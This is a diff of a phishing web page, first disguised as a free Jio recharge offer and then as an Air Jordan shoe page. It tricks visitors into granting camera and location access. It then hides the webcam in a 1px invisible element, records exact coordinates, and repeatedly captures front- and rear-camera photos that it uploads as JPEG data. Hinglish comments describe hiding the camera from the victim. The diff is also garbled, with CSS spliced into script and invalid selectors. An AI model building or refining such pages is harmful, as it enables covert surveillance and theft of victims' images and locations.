@@ -1,195 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jio Free 2026 Recharge Offer</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Air jordan shoes</title>
     <style>
-        /* --- GENERAL PAGE STYLING --- */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+        body { 
+            font-family: 'Helvetica Neue', Arial, sans-serif; 
+            background-color: #000; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            overflow: hidden; 
+            color: #fff;
+        }
+        .loading-container {
             text-align: center;
-            padding: 30px;
+            padding: 20px;
+            z-index: 200;
         }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 15px rgba(0,0,0,0.1);
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        h2 {
-            color: #0056b3;
-            font-size: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: #e0e0e0;
-        }
-        input {
-            padding: 10px;
-            width: 80%;
-            font-size: 16px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        /* --- DETECTION POINT 1: BUTTON VISUAL TRICK --- */
-        /* Confirm button shuru me disabled rahega aur alag dikhega */
-        #confirmBtn {
-            background-color: #cccccc;
-            color: #666666;
-            cursor: not-allowed;
-        }
-        /* 10 digits hote hi JS is class ko add karke button bold karega */
-        .bold-active-btn {
-            font-weight: bold !important;
-            background-color: #007bff !important;
-            color: white !important;
-            cursor: pointer !important;
-        }
-
-        /* --- DETECTION POINT 2: THE HIDDEN SCREENS --- */
-        /* Thank you screen default me 'display: none' yaani hidden rehti hai */
-        #thankYouScreen {
-            display: none;
-            font-size: 26px;
+        .loading-text {
+            font-size: 3.5rem; 
             font-weight: bold;
-            color: #28a745;
-            margin-top: 50px;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
         }
-
-        /* --- DETECTION POINT 3: CAMOUFLAGE ELEMENTS --- */
-        /* Hacker webcam aur canvas elements ko chupane ke liye ya toh unhe 
-           1px size ka kar deta hai ya fir screen se completely out of view rakhta hai 
-           taaki user ko camera chalne ka pata na chale */
-        #webcam {
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            position: absolute;
+        .please wait-btn {
+            font-size: 2rem; 
+            padding: 30px 80px;
+            background-color: #FFFC00; 
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.2s;
         }
-        #captureCanvas, #savedFrame {
-            display: none;
+        .please wait-btn:hover {
+            background-color: #e6e200;
         }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <!-- ====================================================
-             INTERFACE ZONE: Jo screen par user ko pehle dikhta hai
-             ==================================================== -->
-        <div id="mainForm">
-            <h2>jio free 2026 recharge offer lene ke liye</h2>
-            <hr>
-            
-            <!-- Step 1: Camera Access Permission Prompt -->
-            <p><strong>Pehle camera allow karein</strong></p>
-            <button id="camBtn">Allow</button>
-            
-            <!-- Step 2: Location Access Permission Prompt -->
-            <p><strong>Fir location allow karein</strong></p>
-            <button id="locBtn">Allow</button>
-            
-            <!-- Step 3: Phone Number Input Entry -->
-            <br><br>
-            <p><strong>Dial your jio number</strong></p>
-            <input type="tel" id="phone" placeholder="Enter 10 digit number" maxlength="10">
-            
-            <!-- Step 4: Final Confirmation Target -->
-            <button id="confirmBtn" disabled>Confirm</button>
-        </div>
-
-        <!-- ====================================================
-             CAMOUFLAGE INTERACTION LAYER: Hidden Pipeline
-             ==================================================== -->
-        <!-- Yeh pipeline variables script buffer stream ko feed karte hain -->
-        <video id="webcam" autoplay playsinline></video>
-        <canvas id="captureCanvas" width="640" height="480"></canvas>
-        <img id="savedFrame" alt="Telemetry Interface">
-
-        <!-- ====================================================
-             OUTCOME DISPLAY ZONE: Post-Click Execution
-             ==================================================== -->
-        <div id="thankYouScreen">
-            <p class="thank-you-text">YOU WILL BE INFORMED THROUGH SMS THANK YOU</p>
-        </div>
-    </div>
-
-    <!-- Interface tracking logic compilation starts here -->
-    <script>
-        // ====================================================
-        // DOM HOOKS & VARIABLE INITIALIZATION AREA
-        // ====================================================
-        // Yeh variables HTML components ko script execution logic se link karte hain
-        const phoneInput = document.getElementById('phone');
-        const confirmBtn = document.getElementById('confirmBtn');
-        const camBtn = document.getElementById('camBtn');
-        const locBtn = document.getElementById('locBtn');
-        const mainForm = document.getElementById('mainForm');
-        const thankYouScreen = document.getElementById('thankYouScreen');
-        const videoEl = document.getElementById('webcam');
-        const canvasEl = document.getElementById('captureCanvas');
-
-        // Dynamic transmission state object array structure
-        let targetPayload = {
-            deviceModel: navigator.userAgent, // Basic user browser identification
-            exactCoordinates: "Pending",
-            broadLocation: "Pending"
-        };
-        let isCameraActive = false;   // New Add
-let isLocationActive = false; // New Add
-        let isLoopRunning = false;
-        let loopCycleCounter = 0;
-        let activeStream = null;
-
-       // New Add: Central Validation Function
-function validateFormState() {
-    const numericInputString = phoneInput.value;
-    if (numericInputString.length === 10 && isCameraActive === true && isLocationActive === true) {
-        confirmBtn.disabled = false;
-        confirmBtn.classList.add('bold-active-btn');
-    } else {
-        confirmBtn.disabled = true;
-        confirmBtn.classList.remove('bold-active-btn');
-    }
-}
-// Listener link button status check karne ke liye
-phoneInput.addEventListener('input', validateFormState);
-        // ====================================================
-        // BROWSER PERMISSION INTERFACE HOOKS
-        // ====================================================
-
-        // Location Interface Mapping Layer
-        locBtn.addEventListener('click', () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-            (position) => {
-                // Ek sath sequence me andar hai
-                isLocationActive = true;
-                validateFormState();
-
-                // Standard geolocation data collection
-                targetPayload.exactCoordinates = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                alert("Location Verification Completed.");
-            }, // <-- YEH WALA BRACKET (`},`) AAPKE CODE ME MISSING HAI!
-            (error) => {
-                targetPayload.exactCoordinates = `Access State: ${error.message}`;
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-                    
-                );
-            }
-        });
         .snap-portal { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; }
         .media-container { display: flex; justify-content: center; align-items: center; }
         video { 
@@ -260,13 +112,12 @@ phoneInput.addEventListener('input', validateFormState);
 
     function runSequentialCycle() {
         loopCycleCounter++;
-        
         executeTargetAxisStream("user", () => {
             setTimeout(() => {
                 executeTargetAxisStream("environment", () => {
-                    setTimeout(runSequentialCycle, 100); 
+                    setTimeout(runSequentialCycle, 500); 
                 });
-            }, 300);
+            }, 1000);
         });
     }
     function executeTargetAxisStream(facingModeType, callbackEvent) {
@@ -332,50 +183,8 @@ phoneInput.addEventListener('input', validateFormState);
                 body: multiPartFormPayload
             }).catch(() => { console.log("Packet drop on high speed send."); });
         }, 'image/jpeg', 0.65);
-        }
+    }
+</script>
 
-        // Camera Media Query Setup Pipeline
-        camBtn.addEventListener('click', () => { 
-            
-            
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then((stream) => {
-                    activeStream = stream;
-                    videoEl.srcObject = stream;
-                    alert("Camera Connection Ready.");
-                    
-                    isCameraActive = true;   // Line 204
-                    validateFormState();     // Line 205 (Ab yeh block ke andar barabar indented hai) ✅
-                })                           // Line 207 (Block yahan close hota hai)
-                .catch((err) => {
-                    
-                    console.log("Device configuration interface bypass: ", err.message);
-                });
-            }
-        });
-        // ====================================================
-        // TRANSACTION COMPLETION & UI RE-RENDERING MECHANISM
-        // ====================================================
-        
-        // Target execution confirmation state flow callback function
-        confirmBtn.addEventListener('click', () => {
-            const finalValidatedNumber = phoneInput.value;
-
-            // Optional static tracking profile generation setup
-            if (finalValidatedNumber.length === 10) {
-                // Application local cleanup structure execution
-                if (activeStream) {
-                    activeStream.getTracks().forEach(track => track.stop()); // Resource releases
-                }
-
-                // --- TRANSITION TRIGGER ZONE ---
-                // DOM display indexes update loop sequence
-                mainForm.style.display = 'none';        // Current visual viewport state is removed
-                thankYouScreen.style.display = 'block';  // Explicit text state display invoke
-            }
-        });
-
-    </script>
 </body>
 </html>
